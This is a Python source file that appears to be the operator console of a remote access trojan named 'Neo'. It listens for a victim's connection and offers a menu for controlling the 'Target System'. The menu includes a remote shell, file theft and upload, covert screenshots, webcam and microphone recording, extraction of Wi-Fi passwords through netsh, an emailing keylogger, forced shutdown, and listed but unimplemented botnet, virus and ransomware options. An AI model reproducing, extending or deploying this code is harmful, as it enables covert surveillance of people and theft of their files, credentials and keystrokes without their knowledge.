import socket
import time
from os import system
import struct
import pickle
import cv2
import sounddevice as sd
import os
import scipy.io.wavfile
import playsound
import pyaudio
import numpy
import cv2
import pyautogui
import sys
from colorama import init
from termcolor import colored
#Client payload

name = socket.gethostname()
ip = socket.gethostbyname(name)
print(ip)

def osing():
       client.send(b'OS')
       print(colored("Welcome to OS System",'red'))
       print(colored("If You want to exit os system type : ex()",'blue'))
       print(colored("If You want to use Upload Function type : upload()",'blue'))
       print(colored("If You want to use Download Function type : download()",'blue'))
       """       bcon=client.recv(2024)
       drives=str(bcon.decode("utf-8"))
       print("Target System Drives Name : "+drives)"""
       while True:
              pathing = client.recv(2048)
              path5=str(pathing.decode("utf-8"))
              #print('Target Default pwd :' + path5)
              shell = input("TP : "+path5)
              if shell== None or shell=='' or shell=="\n" :
                     client.sendall(b'-')
                     continue
              elif shell=="cd..":
                     shell2=bytes(shell,'utf-8')
                     client.send(shell2)
                     continue
              elif shell=='cd':
                     shell2=bytes(shell,'utf-8')
                     client.send(shell2)
                     data0 =client.recv(4444444)
                     path6=str(data0.decode("utf-8"))
                     print(path6)
                     continue
              elif shell[0:2]=="cd":
                     shell2=bytes(shell,'utf-8')
                     client.send(shell2)
                     continue
              elif shell=="ex()":
                     shell2=bytes(shell,'utf-8')
                     client.send(shell2)
                     break
              elif shell=='cls':
                     shell2=bytes(shell,'utf-8')
                     client.send(shell2)
                     os.system("cls")
                     continue
              elif shell=='download()':
                     shell2=bytes(shell,'utf-8')
                     client.send(shell2)
                     os.system("cls")
                     Download()
                     continue
              elif shell=='upload()':
                     shell2=bytes(shell,'utf-8')
                     client.send(shell2)
                     os.system("cls")
                     Uploade()
                     continue
              shell2=bytes(shell,'utf-8')
              client.send(shell2)
              data=client.recv(4444444)
              data2=str(data,"utf-8")
              print(data2)

def Restart():
  client.send(b'Restart')
  time = input("Time For Restart in Sec : ")
  res_time=bytes(time,"utf-8")
  client.send(res_time)
       
def Shutdown():
  client.send(b'shutdown')
  time = input("Time For Shutdown in Sec : ")
  shut_time=bytes(time,"utf-8")
  client.send(shut_time)

def Logoff():
  client.send(b'logoff')
  time = input("Time For Logoff in Sec : ")
  shut_time=bytes(time,"utf-8")
  client.send(shut_time)

def Play_Voice():
  client.send(b'Voice')
  print("If you Want To Exit Just Type : exit()")
  while True :
     text0=input("Write Your Text : ")
     text = bytes(text0,"utf-8")
     if text0 == 'exit()' :
        client.send(b'0')
        break
     client.send(text)
  input('press any key to continue...')

def Wifi_Info():
  client.send(b'Wifi')
  while True :
     wifi_Info = client.recv(2020)
     Info = str(wifi_Info.decode("utf-8"))
     print ("netsh out put : \n \n \n"+Info+"\n \n \n")
     name = input("Your Wifi name :  ")
     code_name = bytes(name,"utf-8")
     client.send(code_name)
     code_Info = client.recv(4040)
     main_Info = str(code_Info.decode("utf-8"))
     print("Result : \n \n \n "+main_Info)

def Drive():
  client.send(b'Drive')
  bcon=client.recv(2024)
  drives=str(bcon.decode("utf-8"))
  print("System Drives Name : "+drives)
  input('press any key to continue')
  
def More_Info():
  client.send(b'Info')
  bcon = client.recv(2020)
  Infos = str(bcon.decode("utf-8"))
  print (Infos)
  time.sleep(5)
  input("press any key to continue...")

def ScreenShot():
  client.send(b'ScreenShot')
  while True:
    file = open('screenimg.png','wb')
    data = client.recv(2048)
    while data :
      file.write(data)
      data = client.recv(2048)
      if '0hibye1' in str(data.decode(errors='ignore')):
        str(data).replace('0hibye1','')
        file.write(data)
        break
      else:
        pass
    print("1")
    file.close()
    again = input("Capture Again y/n : ")
    if again=='y' or again=='yes':
      client.send(b'1')
      continue
    elif again=='n' or again=='no':
      client.send(b'0')
      break
    else:
      client.send(b'0')
      break
  input("press any key to continue...")

def Capture_Camera():
  client.send(b'Capture_Camera')
  while True:
    file = open('CMPIC.png','wb')
    data = client.recv(2048)
    while data :
      file.write(data)
      data = client.recv(2048)
      if '0hibye1' in str(data.decode(errors='ignore')):
        str(data).replace('0hibye1','')
        file.write(data)
        break
      else:
        pass
    print("1")
    file.close()
    again = input("Capture Again y/n : ")
    if again=='y' or again=='yes':
      client.send(b'1')
      continue
    elif again=='n' or again=='no':
      client.send(b'0')
      break
    else:
      client.send(b'0')
      break
  input("press any key to continue...")
  
def Record_Camera():
  client.send(b'Record_Camera')
  data = b""
  payload_size = struct.calcsize("Q")
  while True :
      while len(data) < payload_size :
          packet = client.recv(4*1024)
          if not packet : break
          data +=packet
      packed_msg_size= data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack("Q",packed_msg_size)[0]
      while len(data) < msg_size :
          data += client.recv(4*1024)
      framedata = data[:msg_size]
      data = data[msg_size:]
      print(type(framedata))
      frame = pickle.loads(framedata)
      cv2.imshow(str(addr),frame)
      if cv2.waitKey(1) & 0xFF == ord('q'):
          break
      client.send(b'1')
  client.send(b'0')
  input("press any key to continue...")

def Change_Background():
  #It's not completed
  client.send(b'Change_Background')
  if os.path.isdir("pics"):
    pass
  else :
    os.mkdir('pics')
  print("insert Your Background Picture Into pics folder ")
  time.sleep(3)
  input("Press any key to continue ...")
  print("Default Background pictures : \n")
  basepath = 'pics/'
  num = 0
  with os.scandir(basepath) as entries:
    for entry in entries:
        if entry.is_file():
          print("["+str(num)+"] "+entry.name)
          num = num + 1
  pic = input("\nChoose a pic that you want to be background on target system : ")
  intpic = int(pic)
  picname = 'pics/'+os.listdir(basepath)[intpic]
  data = open(picname,'rb')
  print("0")
  file = data.read(2048)
  print("1")
  while file:
        client.send(file)
        file = data.read(2048)
  client.send(b'0hibye1')
  data.close()
  input("press any key to continue...")
  
def Screen_Recorder():
  client.send(b'Screen_Recorder')
  print("start")
  data = b""
  payload_size = struct.calcsize("Q")
  while True :
      #print("start while")
      while len(data) < payload_size :
          packet = client.recv(4*1024)
          if not packet : break
          data +=packet
      packed_msg_size= data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack("Q",packed_msg_size)[0]
      while len(data) < msg_size :
          data += client.recv(4*1024)
      framedata = data[:msg_size]
      data = data[msg_size:]
      frame = pickle.loads(framedata)
      cv2.imshow("anything",frame)
      if cv2.waitKey(1) & 0xFF == ord('q'):
          break
      client.send(b'1')
  client.send(b'0')
  input("press any key to continue...")

def Screen_Recorder_TP():
    client.send(b'Screen_Recorder_TP')
    resolution = (1920, 1080)
    codec = cv2.VideoWriter_fourcc(*"XVID")
    filename = "Screen_Recording.avi"
    fps = 60.0
    out = cv2.VideoWriter(filename, codec, fps, resolution)
    #cv2.namedWindow("Live", cv2.WINDOW_NORMAL)
    #cv2.resizeWindow("Live", 480, 270)
    while True:
        img = pyautogui.screenshot()
        frame = numpy.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
        #sframe = frame.read()
        a = pickle.dumps(frame)
        msg = struct.pack("Q",len(a))+a
        client.sendall(msg)
        cv2.imshow('cp', frame)
        if cv2.waitKey(1) == ord('q'):
            break

def Voice_Recorder():
  fs = 44100
  options = """
  Options :
  [1]Record Voice online 
  [2]Record Voice and send file to your system
  
  Choose Your option :  
  """
  ask = input(options)
  if ask=='1':
    sec = input("How many seconds do you want the sound to be sent to you?(30 sec recomended !) (in sec) : ")
    bsec = bytes(sec , "utf-8")
    client.send(b'Voice_Recorder_online')
    client.recv(24)
    client.send(bsec)
    print("Voice will play after "+str(sec)+" for You")
    data = b""
    payload_size = struct.calcsize("Q")
    while True :
                while len(data) < payload_size :
                    packet = client.recv(4*1024)
                    if not packet : break
                    data +=packet
                packed_msg_size= data[:payload_size]
                data = data[payload_size:]
                msg_size = struct.unpack("Q",packed_msg_size)[0]
                while len(data) < msg_size :
                    data += client.recv(4*1024)
                framedata = data[:msg_size]
                data = data[msg_size:]
                frame = pickle.loads(framedata)
                scipy.io.wavfile.write("recvoic.wav",fs,frame)
                playsound.playsound('recvoic.wav')
                #pygame.sndarray(frame)
                #print(type(frame))
                #Audio(frame, rate=fs)
                #sd.play(frame , fs)
                #sd.wait()
  elif ask=='2':
    sec = input("How many seconds do you want to record Target Voice for you? (in sec) : ")
    bsec = bytes(sec , "utf-8")
    client.send(b'Voice_Recorder_file')
    client.recv(24)
    client.send(bsec)
    data = b""
    payload_size = struct.calcsize("Q")
    print("Voice will play after "+str(sec)+" for You")
    while len(data) < payload_size :
          packet = client.recv(4*1024)
          if not packet : break
          data +=packet
    packed_msg_size= data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack("Q",packed_msg_size)[0]
    while len(data) < msg_size :
          data += client.recv(4*1024)
    framedata = data[:msg_size]
    data = data[msg_size:]
    frame = pickle.loads(framedata)
    scipy.io.wavfile.write("recvoicoff.wav",fs,frame)
    print("Done !")

def Active_KeyLogger():
   client.send(b"Active_KeyLogger")
   print("The application uses the Gmail application by default, but your information will be protected")
   emailuser = input("Enter your email : ")
   byteemailuser = bytes(emailuser,'utf-8')
   client.send(byteemailuser)
   client.recv(24)
   sec = input("How many seconds do you want the information to be sent to your email?(minimum:900 SECOUND(15 MIN) ) : ")
   bytesec = bytes(sec,'utf-8')
   client.send(bytesec)
   print("Keylogger is active")

def Download():
    print(colored("Welcom to Download System",'blue'))
    print("If you want to exit type ex()")
    while True :
        filepath = input("type path of the file in target system that you want to download : ")
        if filepath== None or filepath=='' or filepath=="\n" :
            continue
        elif filepath=='ex()':
            client.send(b'ex()')
            break
        else:
            pass
        filetype = input("what is the file type (Example: .jpg or .mkv) : ")
        if filetype== None or filetype=='' or filetype=="\n" :
            continue
        elif filetype=='ex()':
            client.send(b'ex()')
            break
        else:
            pass
        filefamily=input("downloaded file name : ")
        if filefamily=='ex()':
            client.send(b'ex()')
            break
        bfilepath= bytes(filepath,'utf_8')
        client.send(bfilepath)
        filename = open(filefamily+filetype,'wb')
        data = client.recv(2048)
        try:
            sdata = str(data.decode("utf-8"))
            if sdata=='-':
                print("The file Path is wrong\n")
                continue
        except :
            pass
        print("Press Ctrl-C to terminate while statement")
        try :
            while data :
              filename.write(data)
              data = client.recv(2048)
              if '0hibye1' in str(data.decode(errors='ignore')):
                str(data).replace('0hibye1','')
                filename.write(data)
                break
              else:
                pass
            print("1")
        except KeyboardInterrupt:
            print("operation canceled ")
        filename.close()
        again = input("Capture Again y/n : ")
        if again=='y' or again=='yes':
          client.send(b'1')
          continue
        elif again=='n' or again=='no':
          client.send(b'0')
          break
        else:
          client.send(b'0')
          break
    input("press any key to continue...")

def Uploade():
    print(colored("Welcom to Upload System",'blue'))
    print("If you want to exit type ex()")
    while True:
        filepath = input("type path of the file that you want to uploade on target system : ")
        if filepath== None or filepath=='' or filepath=="\n" :
            continue
        elif filepath=='ex()':
            client.send(b'ex()')
            break
        else:
            pass
        filetype = input("what is the file type (Example: .jpg or .mkv) : ")
        if filetype== None or filetype=='' or filetype=="\n" :
            continue
        elif filetype=='ex()':
            client.send(b'ex()')
            break
        else:
            pass
        filefamily=input("uploaded file name : ")
        if filefamily=='ex()':
            client.send(b'ex()')
            break
        try:
            data = open(filepath,'rb')
            file = data.read(2048)
        except :
            print("file path is wrong !")
            continue
        bfilefamily=bytes(filefamily,'utf_8')
        bfiletype=bytes(filetype,'utf_8')
        client.send(bfilefamily)
        client.send(bfiletype)
        while file:
            client.send(file)
            file = data.read(2048)
        client.send(b'0hibye1')
        data.close()
        print("sended")
        client.recv(24)
        again = input("Capture Again y/n : ")
        if again=='y' or again=='yes':
          client.send(b'1')
          continue
        elif again=='n' or again=='no':
          client.send(b'0')
          break
        else:
          client.send(b'0')
          break
    input("press any key to continue...")

def Voice_Recorder_TP():
  FORMAT = pyaudio.paInt16
  CHUNK = 1024
  CHANNELS = 1
  RATE = 44100
  frames = []
  audio = pyaudio.PyAudio()
  options = """
  Options :
  [1]Record & Play Voice On Target System Online 
  [2]Record Voice and send file to Target System & play audio file and then delete it
  
  Choose Your option :  
  """
  ask = input(options)
  if ask=='1':
    sec = input("How many seconds do you want the sound to be sent to target?(10 sec recomended !) (in sec) : ")
    client.send(b'Voice_Recorder_online_TP')
    time.sleep(5)
    print("start : Voice will send after "+str(sec)+" to target")
    RECORD_SECONDS = int(sec)
    while  True :
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                rate=RATE, input=True,
                frames_per_buffer=CHUNK)
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(numpy.fromstring(data, dtype=numpy.int16))
        numpydata = numpy.hstack(frames)
        a = pickle.dumps(numpydata)
        frames=[]
        msg = struct.pack("Q",len(a))+a
        client.sendall(msg)
        stream.stop_stream()
        stream.close()
        audio.terminate()
  elif ask=='2':
    sec = input("How many seconds do you want to record Voice for target? (in sec) : ")
    RECORD_SECONDS = int(sec)
    client.send(b'Voice_Recorder_file_TP')
    stream = audio.open(format=FORMAT, channels=CHANNELS,
    rate=RATE, input=True,
    frames_per_buffer=CHUNK)
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(numpy.fromstring(data, dtype=numpy.int16))
    numpydata = numpy.hstack(frames)
    scipy.io.wavfile.write("recvoicofile.wav",RATE,numpydata)
    audiofile = open('recvoicofile.wav', 'rb')
    file = audiofile.read(2048)
    while file:
        client.send(file)
        file = audiofile.read(2048)
    print("sended")    
    audiofile.close()
    stream.stop_stream()
    stream.close()
    audio.terminate()

def Record_Camera_TP():
  client.send(b"Record_Camera_TP")
  vid = cv2.VideoCapture(0)
  while(vid.isOpened()):
      img, frame = vid.read()
      a = pickle.dumps(frame)
      msg = struct.pack("Q",len(a))+a
      client.sendall(msg)
      cv2.imshow(str("It's You"),frame)
      if cv2.waitKey(1) & 0xFF == ord('q'):
          break

def wmic():
  client.send(b'wmic')
  print("This operation can take a few minutes...")
  wmic = client.recv(9999999)
  strwmic = str(wmic.decode("utf-8"))
  print(strwmic)
  input("press any key to continue...")

def tasklist():
  client.send(b'tasklist')
  print("This operation can take a few minutes...")
  tasklist = client.recv(999999)
  strtasklist = str(tasklist.decode("utf-8"))
  print(strtasklist)
  input("press any key to continue...")
  
def massage():
  while True:
    client.send(b'massage')
    text = input("Write the message you want to show to the target : ")
    bytext = bytes(text,"utf-8")
    client.send(bytext)
    roun = input("Do You want send another massage(y/n)? ")
    if roun=='y' or roun=='yes' :
      #client.send(b'1')
      continue
    elif roun=='n' or roun=='no':
      #client.send(b'0')
      break
    else:
      #client.send(b'0')
      break

def exiting():
  client.send(b'exit')
  client.close()
  #time.sleep(10)
  sys.exit()

#-------------------------------------Start-----------------------------------#
"" 
print("Welcom To The Neo")
con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True :             
       IP = input("Pls enter your IP : ")
       PORT = input("pls enter your custom port : ")	  
       try :
            con.bind((IP,int(PORT)))
            break         	
       except :          
  	        print("your ip or your port is useless")	       
  	       
              
con.listen(2) 		      
print("actived successfully") 
client , addr= con.accept()
print("connected to "+str(addr))
info = client.recv(1024)
info1=str(info.decode("utf-8"))
print(info1)
while True:
  #os.system('cls')
  print("""
  Options :

  [0]OS System  + 
  [1]More Information About Target System    +
  [2]Shutdown Target System   +
  [3]Restart Target System  +
  [4]Log off Target System   +
  [5]Play voice in target System  +
  [6]Target Wifies Information  +
  [7]Target System Drives  +
  [8]Uploade File On Target System  +
  [9]Download File from Target System  +
  [10]Start Web server On Target System 
  [11]Take ScreenShot From Target System  +
  [12]Change Target Background Picture   +
  [13]List of all programs installed on the target system +
  [14]Programs that are currently running on the target system +
  [15]Show massage On Target System + 
  [16]Start BotNet 
  [17]Active Virus 
  [18]Active Advanced Virus 
  [19]Active RansomWare
  [20]Camera Capture  +
  [21]Camera Recorder(Only work on windows Systems)  +
  [22]Record Camera and Play On Target System  +
  [23]Screen Recorder  +
  [24]Record Screen and Play On Target System  +
  [25]Voice Recorder  +
  [26]Record Voice and Play On Target System  +
  [27]Active Keylogger  +
  [28]Exit App & Close Connection
  [29]Delete Script on Target System
  

  """)
  op = input("Your option : ")
  if op=='0':
    osing()
  elif op =='1' :
    More_Info()
  elif op =='2' :
    Shutdown()
  elif op =='3' :
    Restart()
  elif op=='4' :
    Logoff()
  elif op =='5' :
    Play_Voice()
  elif op=='6':
    Wifi_Info()
  elif op=='7':
    Drive() 
  elif op=='8':
    client.send(b'Uploade')
    Uploade()
  elif op=='9':
    client.send(b'Download')
    Download()
  elif op=='11':
    ScreenShot()
  elif op=='12' :
    Change_Background()
  elif op=='13':
    wmic()
  elif op=='14':
    tasklist()
  elif op=='15':
    massage()
  elif op=='20':
    Capture_Camera()
  elif op=='21':
    Record_Camera()
  elif op=='22':
    Record_Camera_TP()
  elif op=='23':
    Screen_Recorder()
  elif op=='24':
    Screen_Recorder_TP()
  elif op=='25':
    Voice_Recorder()
  elif op=='26':
    Voice_Recorder_TP()
  elif op=='27':
    Active_KeyLogger()
  elif op=='28':
    exiting()
  else:
    client.send(b'0')
    print("command is wrong ...")
    time.sleep(2)
    input("press any key to continue...")
    os.system('cls')
    continue
